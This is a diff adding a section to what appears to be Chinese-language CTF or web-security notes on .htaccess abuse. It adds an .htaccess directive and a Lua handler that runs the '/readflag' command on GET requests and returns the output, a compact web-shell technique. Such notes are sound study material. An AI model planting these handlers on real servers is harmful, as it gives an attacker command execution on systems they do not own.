@@ -87,6 +87,24 @@
 
 参考链接 https://github.com/wireghoul/htshells/
 
+### 利用lua
+
+```htaccess
+AddHandler lua-script .lua
+```
+
+```lua
+require "string"
+function handle(r)
+    r.content_type = "text/plain"
+    if r.method == 'GET' then
+        local a = io.popen('/readflag')
+        local b = a:read("*all")
+        r:puts(b)
+    end
+    return apache2.OK
+end
+```
 
 ## 参考资料
 
